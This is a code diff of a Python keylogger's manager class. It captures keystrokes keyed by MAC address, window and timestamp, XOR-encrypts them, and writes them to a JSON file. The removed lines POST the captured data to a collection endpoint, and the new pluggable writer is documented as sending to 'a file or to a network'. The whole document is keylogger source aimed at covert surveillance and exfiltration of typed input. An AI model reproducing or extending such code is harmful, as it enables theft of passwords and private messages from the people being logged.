@@ -1,8 +1,9 @@
 import time
+from KeyloggerAgent.Write import IWriter
 from KeyloggerService import KeyLoggerService
 from Encryption import XOREncryption
 from Write import FileWriter
-import requests
+
 
 
 
@@ -16,27 +17,15 @@ class KeyLoggerManager:
     def start_listening(self):
         """
         Starts listening and sends the values
-        to be written to a json file
+        to be written to a json file or to a network
         """
         self.service.start_listening()
         print("Keylogger is starting!")
         while True:
             time.sleep(5)
             data = self.service.get_data()
-            self._write_to_file(self.encrypt(data),'log.json')
-            encrypted_data=self.encrypt(data)
-            self.send_data(encrypted_data)
-    @staticmethod
-    def send_data(data: dict):
-        try:
-            requests.post(
-                "http://localhost:5555/home", 
-                json={"machine_name": "Test Machine", "data": data},
-                headers={'Content-Type': 'application/json'}
-            )
-            
-        except Exception as e:
-            print(f" Error sending data {e}")
+            self._writer(self.writer , self.encrypt(data),'log.json')
+
     def stop_listening(self):
         """
          Stops listening to keyboard keys
@@ -49,10 +38,12 @@ class KeyLoggerManager:
          and returns an encrypted dictionary
         """
         temp_dict = dict()
-        for key , val in data.items():
-            temp_dict[key] = dict()
-            for k , v in val.items():
-                 temp_dict[key][k] = self.__encryption.encrypt(v)
+        for mac , user_dict in data.items():
+            temp_dict[mac] = dict()
+            for  window, data_dict in user_dict.items():
+                temp_dict[mac][window] = dict()
+                for timestamp ,data_keys in data_dict.items():
+                     temp_dict[mac][window][timestamp]= self.__encryption.encrypt(data_keys)
         return temp_dict
 
 
@@ -63,20 +54,23 @@ class KeyLoggerManager:
         """
         temp_dict = dict()
         data = self.writer.load('log.json')
-        for key, val in data.items():
-            temp_dict[key] = dict()
-            for k, v in val.items():
-                temp_dict[key][k] = self.__encryption.decrypt(v)
+        for mac, user_dict in data.items():
+            temp_dict[mac] = dict()
+            for window, data_dict in user_dict.items():
+                temp_dict[mac][window] = dict()
+                for timestamp, data_keys in data_dict.items():
+                    temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
         return temp_dict
-
-    def _write_to_file(self,data:dict, file_name:str):
+    @staticmethod
+    def _writer(write:IWriter, data:dict, name:str):
         """
-        Writes text to a json file
+        Writes text to a json file or to a network
         """
-        self.writer.write(data ,file_name)
+        write.write(data , name)
 
 if __name__ == "__main__":
     keylogger = KeyLoggerManager()
     keylogger.start_listening()
+
 
 
